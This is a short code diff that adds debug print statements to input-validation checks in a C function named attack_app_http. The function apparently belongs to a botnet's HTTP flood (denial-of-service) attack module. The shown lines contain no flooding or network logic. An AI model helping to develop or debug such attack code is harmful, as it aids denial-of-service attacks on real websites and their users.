@@ -37,17 +37,25 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
 
     char generic_memes[10241] = {0};
 
-    if (domain == NULL || path == NULL)
+    if (domain == NULL || path == NULL){
+	    printf("either domain or path is null");
         return;
+    }
 
-    if (util_strlen(path) > HTTP_PATH_MAX - 1)
+    if (util_strlen(path) > HTTP_PATH_MAX - 1){
+	    printf("http pathlength exceeds max length");
         return;
+    }
 
-    if (util_strlen(domain) > HTTP_DOMAIN_MAX - 1)
+    if (util_strlen(domain) > HTTP_DOMAIN_MAX - 1){
+	    printf("http domain exceeds max");
         return;
+    }
 
-    if (util_strlen(method) > 9)
+    if (util_strlen(method) > 9){
+	    printf("method exceeds max");
         return;
+    }
 
     // BUT BRAH WHAT IF METHOD IS THE DEFAULT VALUE WONT IT SEGFAULT CAUSE READ ONLY STRING?
     // yes it would segfault but we only update the values if they are not already uppercase.
